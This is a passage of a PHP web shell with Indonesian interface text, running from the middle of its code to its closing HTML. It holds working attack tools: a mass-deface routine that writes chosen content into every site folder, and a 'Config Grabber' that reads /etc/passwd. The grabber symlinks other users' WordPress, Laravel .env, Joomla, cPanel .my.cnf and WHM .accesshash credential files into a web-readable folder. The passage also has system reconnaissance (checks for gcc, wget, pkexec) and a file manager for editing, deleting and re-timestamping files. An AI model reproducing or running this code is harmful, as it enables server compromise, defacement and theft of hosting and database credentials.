            $output .= "Gagal akses folder =><font color='red'> " . $fname . "/<br>";
            continue;
        }

        $targetPath = $folder . DIRECTORY_SEPARATOR . $pilez;

        if (file_exists($targetPath)) {
            $output .= "File Sudah ada => <font color='orange'>http://" . $fname . "/" . $pilez."</font><br>";
        } else {
            if (file_put_contents($targetPath, $konten) !== false) {
                $output .= "<font color='lime'>http://" . $fname . "/" . $pilez."<br>";
            } else {
                $output .= "Gagal =><font color='red'> http://" . $fname . "/" . $pilez."<br>";
            }
        }
    }

    return $output;
}

if (isset($_POST['massc'])) {
    $pilez = $_POST['pile'];
    $pat = $_POST['pat'];
    $kon = $_POST['kont'];

    echo "<div class='card p-3 text-white bg-dark'><div class='mb-3'>";
    echo massDepes($pat, $pilez, $kon);
    echo "</div></div>";
} else {
    echo '<div class="card p-4 text-white bg-dark sm"><center>
    <h3>Mass Deface</h3></center>
    <form method="POST">
  <label>Filename :</label><br>
  <input type="text" class="form-control" style="background-color:#17202a;color:#fff;" value="file.txt" name="pile" required><br>
  <label>Path :</label><br>
  <input type="text" class="form-control" style="background-color:#17202a;color:#fff;" value="'.$currentDir.'" name="pat" required><br>
  <label>Isi File :</label><br>
  <textarea name="kont" id="php_code"></textarea><br>
  <button type="submit" class="btn btn-success btn-sm" name="massc">Submit</button>
</form></div>
  <script>
        var editor = CodeMirror.fromTextArea(document.getElementById("php_code"), {
            lineNumbers: true,
            mode: "application/x-httpd-php",
            theme: "material", 
            lineWrapping: true,
            viewportMargin: Infinity
            });
    </script>';
}exit;

} elseif ($_GET['d7net'] == allheks('cnfig')) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['conf'])) {
    $v = "var";
    $folfig = $_POST['folfig'];
    $type = $_POST['type'] ?? '.txt';
    @mkdir($folfig, 0755, true);
    @chdir($folfig);

    $htaccess = "
Options Indexes FollowSymLinks
\nDirectoryIndex .my.cnf
\nAddType txt .php
\nAddType txt .my.cnf
\nAddType txt .accesshash
\nAddHandler txt .php
\nAddHandler txt .cnf
\nAddHandler txt .accesshash";
    file_put_contents(".htaccess", $htaccess, FILE_APPEND);

    $passwd = explode("\n", $_POST["passwd"]);
    foreach ($passwd as $pwd) {
        $user = trim($pwd);
        if ($user === '') continue;
        
        $paths = [
            "/home/$user/public_html/vb/includes/config.php" => "$user-vBulletin1$type",
            "/home/$user/public_html/forum/includes/config.php" => "$user-vBulletin3$type",
            "/home/$user/public_html/cc/includes/config.php" => "$user-vBulletin4$type",
            "/home/$user/public_html/config.php" => "$user-Phpbb1$type",
            "/home/$user/public_html/admin/config.php" => "$user-Phpbb2$type",
            "/home/$user/public_html/koneksi.php" => "$user-Phpbb3$type",
            "/home/$user/public_html/wp-config.php" => "$user-Wp1$type",
            "/home/$user/public_html/blog/wp-config.php" => "$user-Wp2$type",
            "/home/$user/public_html/web/wp-config.php" => "$user-Wp3$type",
            "/home1/$user/public_html/wp-config.php" => "$user-WpHm1$type",
            "/var/www/html/wp-config.php" => "$v-wp1$type",
            "/home/$user/public_html/.env" => "$user-Laravel1$type",
            "/home/$user/public_html/web/.env" => "$user-Laravel2$type",
            "/home/$user/public_html/public/.env" => "$user-Laravel3$type",
            "/var/www/html/.env" => "$v-LaravelV$type",
            "/home/$user/public_html/configuration.php" => "$user-Joomla1$type",
            "/home/$user/public_html/html/configuration.php" => "$user-Joomla2$type",
            "/home/$user/public_html/application/config/database.php" => "$user-CodeIgniter$type",
            "/home/$user/.my.cnf" => "$user-cpanel$type",
            "/home/$user/.accesshash" => "$user-whm$type"
        ];

        foreach ($paths as $target => $linkName) {
            @symlink($target, $linkName);
        }
    }

    echo '<div class="card p-4 text-white bg-dark sm">
    Status : Done ✅ <br><br>
    <form action="' . htmlspecialchars($folfig) . '" method="GET" target="_blank" style="display: inline;">
        <button type="submit" class="btn btn-sm btn-success">Klik di sini</button>
    </form>
</div>';
} else {
    $users = file("/etc/passwd");
    echo '<form method="POST">
    <div class="card p-4 text-white bg-dark sm"><tr><td>
    <center>
        <h3>Config Grabber (Audit)</h3>
        <textarea name="passwd" class="form-control" id="exampleFormControlTextarea1" rows="22">';
    foreach ($users as $line) {
        $parts = explode(":", $line);
        echo htmlspecialchars($parts[0]) . "\n";
    }
    echo '</textarea><br><br>
        <input type="hidden" name="folfig" value="d7netcfg" />
        <select name="type" class="form-select form-select-sm" style="width:150px;">
            <option value=".txt">.txt</option>
            <option value=".php">.php</option>
            <option value=".shtml">.shtml</option>
            <option value=".ini">.ini</option>
            <option value=".html">.html</option>
        </select><br><br>
        <input name="conf" value="Submit" class="btn btn-outline-light" type="submit" />
    </center></td></tr></form></div>';
    } exit;
} elseif ($_REQUEST['d7net'] == allheks('cfile')) {
    if (isset($_POST['createf'])) {
        $nama_file = basename(trim($_POST["pile"]));
        $isi_file = $_POST["kont"];
        $file = fopen("$currentDir/$nama_file", "w");
        if ($file) {
            fwrite($file, $isi_file);
            fclose($file);
            echo "<div class='p-4 text-white bg-dark sm mb-3'>File <font color='lime'>$nama_file</font> berhasil dibuat.</div>";
            echo "<script>setTimeout(() => { window.location.href = '" . basename($_SERVER['SCRIPT_FILENAME']) . "?opet=" . allheks($currentDir) . "'; }, 2000);</script>";
        } else {
            echo "<div class='p-4 text-white bg-dark sm mb-3'><font color='red'>Gagal membuat file.</font></div>";
            echo "<script>setTimeout(() => { window.location.href = '" . basename($_SERVER['SCRIPT_FILENAME']) . "?opet=" . allheks($currentDir) . "&d7net=".allheks('cfile')."'; }, 2000);</script>";
        }
    }
    echo '<div class="card p-4 text-white bg-dark sm">
    <form method="POST">
  <label>Filename :</label><br>
  <input type="text" class="form-control" style="background-color:#17202a;color:#fff;" value="file.txt" name="pile" required><br>
  <label>Isi File :</label><br>
  <textarea name="kont" id="php_code"></textarea><br>
  <button type="submit" class="btn btn-success btn-sm" name="createf">Buat File</button>
</form></div>
  <script>
        var editor = CodeMirror.fromTextArea(document.getElementById("php_code"), {
            lineNumbers: true,
            mode: "application/x-httpd-php",
            theme: "material", 
            lineWrapping: true,
            viewportMargin: Infinity
            });
    </script>'; exit;
} elseif ($_GET['d7net'] == allheks('cdir')) {
    if (isset($_POST['create_folder'])) {
        $peth = $currentDir .'/'. $_POST['folname'];
        if (!file_exists($peth)) {
            if (mkdir($peth, 0755, true)) {
                echo "<div class='p-4 text-white bg-dark sm mb-3'>✅ Folder berhasil dibuat => <font color='lime'>$peth</font></div>";
                echo "<script>setTimeout(() => { window.location.href = '" . basename($_SERVER['SCRIPT_FILENAME']) . "?opet=" . allheks($currentDir) . "'; }, 2000);</script>"; 
            } else {
                echo "<div class='p-4 text-white bg-dark sm mb-3'>❌ <font color='red'>Gagal membuat folder => <i class='fas fa-folder text-danger me-1'></i>".basename($peth)."</font></div>";
            }
        } else {
            echo "<div class='p-4 text-white bg-dark sm mb-3'>⚠️ <font color='orange'>Folder sudah ada</font> => <i class='fas fa-folder text-warning me-1'></i>".basename($peth)."</div>";
            }
        }
    echo '<div class="card p-4 text-white bg-dark sm">
    <form method="POST">
    <label>New Folder:</label>
    <input type="text" class="form-control" name="folname" placeholder="crottz" required><br>
    <button type="submit" class="btn btn-success btn-sm" name="create_folder">Buat Folder</button>
</form></div>';exit;
} elseif ($_GET['d7net'] == allheks('info')) {
    echo "<div class='p-4 text-white bg-dark sm mb-3'>
    System : <font color='#17c6cd'>".php_uname()."</font><br>
    IP Address : <font color='#17c6cd'>".$_SERVER['SERVER_ADDR']."</font><br>
    PHP Version : <font color='#17c6cd'>".phpversion()."</font><br>
    Server : <font color='#17c6cd'>".$_SERVER['SERVER_SOFTWARE']."</font><br>";
    echo "MYSQL : ";
    if (function_exists("mysql_connect")) {
        echo "<font color=lime>ON</font>";
    } else {
        echo "<font color=red>OFF</font>";
    }
    echo " &nbsp;| cURL : ";
    if (function_exists("curl_init")) {
        echo "<font color=lime>ON</font>";
    } else {
        echo "<font color=red>OFF</font>";
    }
    echo " &nbsp;| WGET : ";
    if (file_exists("/usr/bin/wget")) {
        echo "<font color=lime>ON</font>";
    } else {
        echo "<font color=red>OFF</font>";
    }echo " &nbsp;| Perl : ";
    if (file_exists("/usr/bin/perl")) {
        echo "<font color=lime>ON</font>";
    } else {
        echo "<font color=red>OFF</font>";
    }
    echo " &nbsp;| Python : ";
    if (file_exists("/usr/bin/python2")) {
        echo "<font color=lime>ON</font>";
    } else {
        echo "<font color=red>OFF</font>";
    }
    echo "&nbsp; | GCC : ";
    $gecece = gcc();
    if ($gecece) {
    echo "<font color='lime'>ON</font>";
    } else {
    echo "<font color='red'>OFF</font>";
    } 
    echo "&nbsp; | PKEXEC : ";
    if (pkesek()) {
    echo "<font color='lime'>ON</font>";
    } else {
    echo "<font color='red'>OFF</font>";
}
    exit;
}
function stats($file){
    $izin = substr(sprintf('%o', fileperms($file)), -4);
    return $izin;
}
if (!is_readable($currentDir)) {
    die('<div class="card p-2 text-white bg-dark"><div class="mb-1">
    Permission : <font color="red"> Denied <i class="fa-regular fa-face-frown"></i></font><br>
    Gagal akses folder => <i class="fas fa-folder text-warning me-1"></i><font color="orange">'.basename($currentDir).'</font>
    </div></div>');
}
?>
<div class="card p-2 text-white bg-dark">
<div class="table-responsive mt-2">
    <table class="table table-dark table-hover">
        <thead class="table-dark">
            <tr>
                <th><center>Name</center></th>
                <th><center>Size</center></th>
                <th><center>Date Modified</center></th>
                <th><center>Owner</center></th>
                <th><center>Permissions</center></th>
                <th><center>Actions</center></th>
            </tr>
        </thead>
        <tbody>
            <?php foreach ($allItems as $item): ?>
                <tr>
                    <td>
                        <?php
                        $fullPath = $currentDir . '/' . $item;
                        if (is_dir($fullPath)) {
                            echo "<a href='?opet=" . allheks($fullPath) . "' class='link-offset-2 link-underline link-underline-opacity-0'><i class='fas fa-folder text-warning me-1'></i>" . htmlspecialchars($item) . "</a>";
                        } else {
                            echo "<i class='fa-regular fa-file'></i> " . htmlspecialchars($item);
                        }
                        ?>
                    </td>
                    <td><center><?php echo is_file($fullPath) ? fsize(filesize($fullPath)) : '-'; ?></center></td>
                    <td><center><font color="#19e1ea"><?php echo date("d F Y H:i:s", filemtime($fullPath)); ?></font></center></td>
                    <td><center><?php echo owner($fullPath); ?></center></td>
                    <td><center><?php if(is_writable("$fullPath")) echo '<font color="lime">';
                    elseif(!is_readable("$fullPath")) echo '<font color="red">'; echo stats("$fullPath");
                    if(is_writable("$fullPath") || !is_readable("$fullPath")) echo '</font>';
                     ?></center></td>
                    <td>
                        <div class="d-flex flex-column flex-md-row gap-1"><?php if (is_file($fullPath)): ?>
                            <a href="?edit=<?php echo $fullPath; ?>" class="btn btn-sm btn-primary"><i class="fas fa-edit"></i></a>
                            <?php endif; ?>

                            <button type="button" class="btn btn-sm btn-warning"data-bs-toggle="modal" data-bs-target="#renameModal" data-oldpath="<?php echo htmlspecialchars($fullPath); ?>"data-name="<?php echo htmlspecialchars(basename($fullPath)); ?>"><i class="fa-solid fa-pen"></i></button>
                            <a href="?chdet=<?php echo $fullPath; ?>" class="btn btn-sm btn-info"><i class="fa-solid fa-calendar"></i></a>
                            <form method="post">
                                <input type="hidden" name="action" value="delete">
                                <input type="hidden" name="path" value="<?php echo $fullPath; ?>">
                                <button type="submit" class="btn btn-sm btn-danger"><i class="fa-solid fa-trash"></i></button>
                            </form>
                        </div>
                    </td>
                </tr>
            <?php endforeach; ?>
        </tbody>
    </table>
</div>
    <div class="modal fade" id="renameModal" aria-hidden="true" aria-labelledby="exampleModalToggleLabel" tabindex="-1">
  <div class="modal-dialog modal-dialog-centered">
    <div class="modal-content bg-dark text-white">
      <div class="modal-header">
      <form method="post" id="renameForm">
        <h5 class="modal-title" id="exampleModalToggleLabel">Rename</h5>
      </div>
      <div class="modal-body">
          <input type="hidden" name="action" value="rename_item">
          <input type="hidden" name="old_path" id="renameOldPath">
          <div class="mb-3">
            <label for="new_name" class="form-label">New Name</label>
            <input type="text" class="form-control" name="new_name" id="renameNewName" required>
          </div>
        </div>
        <div class="modal-footer">
          <button type="submit" class="btn btn-success">Rename</button>
          <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
        </div>
      </div>
    </form>
  </div>
</div>
</div>
<div class="modal fade" id="successModal" tabindex="-1" aria-labelledby="successModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered">
    <div class="modal-content bg-dark text-white">
      <div class="modal-header">
        <h5 class="modal-title" id="successModalLabel">Success</h5>
        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
      </div>
      <div class="modal-body">
        <i class="fas fa-check-circle text-success"></i> Berhasil mengubah nama!
      </div>
    </div>
  </div>
</div>
<div class="modal fade" id="failModal" tabindex="-1" aria-labelledby="failModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered">
    <div class="modal-content bg-dark text-white">
      <div class="modal-header">
        <h5 class="modal-title" id="failModalLabel">Error</h5>
        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
      </div>
      <div class="modal-body">
        <i class="fas fa-times-circle text-danger"></i> Gagal mengubah nama!
      </div>
    </div>
  </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', () => {
    const renameModal = document.getElementById('renameModal');
    renameModal.addEventListener('show.bs.modal', function (event) {
        const button = event.relatedTarget;
        const oldPath = button.getAttribute('data-oldpath');
        const name = button.getAttribute('data-name');

        document.getElementById('renameOldPath').value = oldPath;
        document.getElementById('renameNewName').value = name;
    });
});

</script>
</body>
</html>
